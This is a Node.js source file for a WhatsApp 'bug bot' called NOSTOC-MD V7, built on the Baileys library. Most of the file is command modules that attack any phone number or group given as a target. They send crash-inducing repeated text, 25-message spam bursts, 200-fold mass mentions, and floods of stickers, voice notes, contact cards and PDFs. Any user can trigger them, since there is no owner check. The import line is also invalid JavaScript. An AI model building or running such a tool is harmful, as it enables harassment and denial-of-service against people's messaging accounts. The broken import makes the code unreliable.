import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import 'dotenv/config';
import { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay, proto } from '@whiskeysockets/baileys';
import express from 'express';
import chalk from 'chalk';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ===== NOSTOC V7 SYSTEM CONFIG =====
const BOT_NAME = "NOSTOC-MD";
const VERSION = "V7.0.0";
const OWNER = "Nostoc";
const PREFIX = "!";
const OWNER_NUMBER = process.env.OWNER_NUMBER || "234XXXXXXXXXX";
const PHONE_NUMBER = process.env.PHONE_NUMBER || "234XXXXXXXXXX";

const THEME = {
    banner: `\n[VIGILANT SYSTEM // ${VERSION}]\n> COLD STORAGE ENGINE INITIALIZED\n> OPERATOR: ${OWNER.toUpperCase()}\n----------------------------------------`,
    prefix: `[NOSTOC://V7]`,
    line: `----------------------------------------`
};

const app = express();
app.get('/', (req,res) => res.send(`${BOT_NAME} ${VERSION} IS ONLINE ✅ by ${OWNER}`));

// Memory Registries
const commands = new Map();
const cooldowns = new Map();
let sock;

// 1. DYNAMIC COMMAND LOADER + ALL V7 BUGS
async function loadCommands() {
    const commandsDir = path.join(__dirname, 'commands');
    if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir);

    // V7 ALL COMMANDS
    const defaultCmds = {
        'menu.js': `
export default {
  name: 'menu',
  cooldown: 2000,
  execute: (args, sender, botName, version, creator, startTime) => {
    const ping = Date.now() - startTime;
    return \`╭─── \${botName} \${version} ───╮
│ Creator: \${creator}
│ Engine: COLD STORAGE
│ Speed: \${ping}ms
│
│!ping - Check speed
│!bug <num> - Crash Bug
│!spam <num> <text> - Spam Bug
│!delay <num> - Delay Bug
│!stickerbug <num> - Sticker Bug
│!gcbug <num> - Group Bug
│!voicenotebug <num> - VN Bug
│!contactbug <num> - Contact Bug
│!docbug <num> - Doc Bug
│!owner - Contact owner
╰───────────────────╯\`;
  }
};`,
        'ping.js': `
export default {
  name: 'ping',
  cooldown: 1000,
  execute: (args, sender, botName, version, creator, startTime) => {
    const ping = Date.now() - startTime;
    return \`*NOSTOC V7 SPEED* \n\${ping}ms ⚡ COLD STORAGE\`;
  }
};`,
        'owner.js': `
export default {
  name: 'owner',
  cooldown: 5000,
  execute: () => {
    return \`*OPERATOR: NOSTOC*\nwa.me/234XXXXXXXXXX\nV7 COLD STORAGE\`;
  }
};`,
        // BUG 1: CRASH
        'bug.js': `
export default {
  name: 'bug',
  cooldown: 10000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    await sock.sendMessage(target, { text: 'NOSTOC-V7-CRASH '.repeat(5000) });
    return \`V7 CRASH BUG SENT TO \${args[0] || 'YOU'}\`;
  }
};`,
        // BUG 2: SPAM
        'spam.js': `
export default {
  name: 'spam',
  cooldown: 15000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const [target,...msg] = args;
    if(!target) return 'Usage:!spam 234xxx message';
    const jid = target + '@s.whatsapp.net';
    const text = msg.join(' ') || 'NOSTOC-V7-SPAM';
    for(let i=0; i<25; i++) {
      await sock.sendMessage(jid, { text: \`\${text} [\${i+1}/25]\` });
      await delay(100);
    }
    return \`V7 SPAMMED \${target} x25\`;
  }
};`,
        // BUG 3: DELAY
        'delay.js': `
export default {
  name: 'delay',
  cooldown: 10000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    await sock.sendMessage(target, { text: 'V7 Loading...' });
    await delay(20000);
    await sock.sendMessage(target, { text: 'NOSTOC V7 DELAY BUG ACTIVATED' });
    return \`V7 DELAY BUG SENT TO \${args[0] || 'YOU'}\`;
  }
};`,
        // BUG 4: STICKER BUG
        'stickerbug.js': `
export default {
  name: 'stickerbug',
  cooldown: 20000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    const sticker = { sticker: { url: 'https://i.imgur.com/large-sticker.webp' } };
    for(let i=0; i<10; i++) await sock.sendMessage(target, sticker);
    return \`V7 STICKER BUG SENT TO \${args[0] || 'YOU'} x10\`;
  }
};`,
        // BUG 5: GC BUG
        'gcbug.js': `
export default {
  name: 'gcbug',
  cooldown: 30000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@g.us' : sender;
    await sock.sendMessage(target, { text: '@everyone '.repeat(200) + 'NOSTOC-V7-GC-BUG' });
    return \`V7 GROUP BUG SENT\`;
  }
};`,
        // BUG 6: VOICENOTE BUG
        'voicenotebug.js': `
export default {
  name: 'voicenotebug',
  cooldown: 25000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    const audio = { audio: { url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3' }, mimetype: 'audio/mp4', ptt: true };
    for(let i=0; i<5; i++) await sock.sendMessage(target, audio);
    return \`V7 VOICENOTE BUG SENT TO \${args[0] || 'YOU'} x5\`;
  }
};`,
        // BUG 7: CONTACT BUG
        'contactbug.js': `
export default {
  name: 'contactbug',
  cooldown: 20000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    const contacts = [];
    for(let i=0; i<50; i++) {
      contacts.push({ displayName: 'NOSTOC-BUG', vcard: 'BEGIN:VCARD\\nVERSION:3.0\\nFN:NOSTOC-BUG\\nTEL:+234000000\\nEND:VCARD' });
    }
    await sock.sendMessage(target, { contacts: { contacts } });
    return \`V7 CONTACT BUG SENT TO \${args[0] || 'YOU'}\`;
  }
};`,
        // BUG 8: DOC BUG
        'docbug.js': `
export default {
  name: 'docbug',
  cooldown: 20000,
  execute: async (args, sender, botName, version, creator, startTime, sock) => {
    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
    const doc = { document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' }, mimetype: 'application/pdf', fileName: 'NOSTOC-V7-BUG.pdf' };
    for(let i=0; i<5; i++) await sock.sendMessage(target, doc);
    return \`V7 DOC BUG SENT TO \${args[0] || 'YOU'} x5\`;
  }
};`
    };

    for(const [name, code] of Object.entries(defaultCmds)) {
        if (!fs.existsSync(path.join(commandsDir, name))) {
            fs.writeFileSync(path.join(commandsDir, name), code);
        }
    }

    const commandFiles = fs.readdirSync(commandsDir).filter(file => file.endsWith('.js'));
    for (const file of commandFiles) {
        try {
            const module = await import(`file://${path.join(commandsDir, file)}`);
            if (module.default && module.default.name) {
                commands.set(module.default.name, module.default);
            }
        } catch (error) {
            console.error(`> ERROR LOADING: ${file} | ${error.message}`);
        }
    }
}

// 2. ANTI-SPAM V7
function isSpamming(sender, commandName, cooldownMs) {
    if (!cooldowns.has(commandName)) cooldowns.set(commandName, new Map());
    const now = Date.now();
    const timestamps = cooldowns.get(commandName);
    if (timestamps.has(sender)) {
        const expirationTime = timestamps.get(sender) + cooldownMs;
        if (now < expirationTime) return Math.ceil((expirationTime - now) / 1000);
    }
    timestamps.set(sender, now);
    return 0;
}

// 3. WHATSAPP CONNECTION V7
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    sock = makeWASocket({
        auth: state,
        browser: [BOT_NAME, "Desktop", VERSION],
        printQRInTerminal: false,
        logger: { level: 'silent' }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if(connection === 'open') console.log(chalk.green(`${BOT_NAME} ${VERSION} Connected ✅ COLD STORAGE`));
        if(connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode!== DisconnectReason.loggedOut;
            if(shouldReconnect) startBot();
        }
    });

    if (!state.creds.registered) {
        await delay(2000);
        const code = await sock.requestPairingCode(PHONE_NUMBER);
        console.log(`\n========================================`);
        console.log(`🔑 V7 PAIRING CODE: ${code}`);
        console.log(`========================================\n`);
    }

    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if(!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const sender = msg.key.participant || from;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        if(!text.startsWith(PREFIX)) return;

        const startTime = Date.now();
        const tokens = text.slice(PREFIX.length).trim().split(/ +/);
        const commandName = tokens.shift().toLowerCase();

        if (!commands.has(commandName)) return;

        const command = commands.get(commandName);
        const cooldownTime = command.cooldown || 2000;

        const timeLeft = isSpamming(sender, commandName, cooldownTime);
        if (timeLeft > 0) {
            return await sock.sendMessage(from, { text: `${THEME.prefix}\n> RATE_LIMIT: ${timeLeft}s` });
        }

        try {
            const result = await command.execute(tokens, sender, BOT_NAME, VERSION, OWNER, startTime, sock);
            await sock.sendMessage(from, { text: `${THEME.prefix}\n${THEME.line}\n${result}\n${THEME.line}` });
        } catch (error) {
            await sock.sendMessage(from, { text: `${THEME.prefix}\n> ERROR: ${error.message}` });
        }
    });
}

// SYSTEM START V7
(async () => {
    console.log(THEME.banner);
    await loadCommands();
    console.log(`> V7 SYSTEM: Loaded ${commands.size} modules into COLD STORAGE.`);
    startBot();
})();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`> V7 Web server running`));